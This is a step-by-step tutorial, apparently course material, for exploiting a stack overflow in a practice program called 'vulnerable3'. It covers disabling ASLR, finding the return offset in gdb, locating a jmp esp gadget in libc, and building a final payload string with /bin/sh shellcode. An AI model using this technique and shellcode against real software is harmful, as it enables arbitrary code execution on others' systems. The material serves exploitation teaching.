0. This is a step-by-step description of how to user jmp esp gadget technique
for smashing the stack. Note, that ASLR must be disabled for this technique to
succeed:
   # echo 0 > /proc/sys/kernel/randomize_va_space

1. Try to overflow the buffer by gradually adding alphabet letters to the
exploitation stirng:
   $ ./vulnerable3 AAAA
   Going to copy 4 bytes to the buffer of size 4... Done!
   $ ./vulnerable3 AAAABBBBCCCCDDDD
   Going to copy 16 bytes to the buffer of size 4... Done!
   $ ./vulnerable3 AAAABBBBCCCCDDDDEEEE
   Segmentation fault
   $ ./vulnerable3 AAAABBBBCCCCDDDDEEEEFFFF
   Segmentation fault

2. EEEE or FFFF were considered as the return address, and the program attempted
to transfer its execution to address 0x45454545 (ascii codes of E) or 0x46464646
(ascii codes of F).
Check in the debugger which one is the return address:
   $ gdb --args ./vulnerable3 AAAABBBBCCCCDDDDEEEEFFFF
   (gdb) ctrl+x,2
   (gdb) b vuln
   (gdb) r
   (gdb) n (until you step over the strcpy call)
   (gdb) si (until you reach ret instruction)
   (gdb) x/s $esp
     0xffffc7cc:     "FFFF"
So this means that ret instruction will attempt to jump at the FFFF part of our
exploitation string.

3. We need to find the address in memory of the vulnerable3 process, that will
satisfy the following requirements:
   a) it will reside in the executable part of the memory
   b) the address itself will not contain null bytes
   c) it will point to the following cpu instruction: jmp esp (ff e4 or 0xe4ff)
This address will be popped off the stack by ret instruction and execution will
be transferred there, leaving the tail of the exploitation string on top of the
stack. jmp esp will simply jump to our exploitation string's tail. By the tail
it is meant the shellcode itself:
   AAAABBBBCCCCDDDDEEEEFFFF_SHELLCODE_
But instead FFFF there should be a valid null-free address of jmp esp
instruction. And it must be the same address between proram's runs.
A good candidate for such a search is libc.so:
   (gdb) i proc map
     Start Addr   End Addr      Size Offset objfile
     0xf7dca000 0xf7fa8000  0x1de000    0x0 /usr/lib/i386-linux-gnu/libc-2.30.so
Pay attention to the entry of mapped memory with the biggest size - it must be
the region for libc's code segment. Taking start address and size, issue:
   (gdb) find /h 0xf7dca000, +0x1de000, 0xe4ff
     ...
     0xf7f96677
     0xf7f9ad8f
     0xf7f9bd1f
     82 patterns found.
Pick the one from the list that does not contain null bytes, and check it:
   (gdb) x/i 0xf7f9bd1f
     0xf7f9bd1f:  jmp *%esp
Reverse the bytes in the address (0xf7f9bd1f -> 1fbdf9f7) and add it to our
exploitation string instead of FFFF, converting it previously from hex to ASCII
with xxd:
   $ echo 1fbdf9f7 | xxd -r -p
So now our string will look like this:
   AAAABBBBCCCCDDDDEEEE`echo 1fbdf9f7 | xxd -r -p`_SHELLCODE_

4. Prepare shellcode string in ASCII form. Copy the shellcode in hex form from
step3/nfshellcode.c or step5/generator1.c to some text editor, find and replace
all the \x and " symbols and make it one line:
   eb1f5e31c088460789760889460cb00b89f38d4e088d560ccd8031db89d840cd80e8dcffffff
This is only the executable code part, without /bin/sh string at the end, since
it is already in ASCII form.
Putting all the pieces together:
   AAAABBBBCCCCDDDDEEEE`echo 1fbdf9f7eb1f5e31c088460789760889460cb00b89f38d4e088d560ccd8031db89d840cd80e8dcffffff | xxd -r -p`/bin/sh
And pass this string/command to vulnerable3 program.

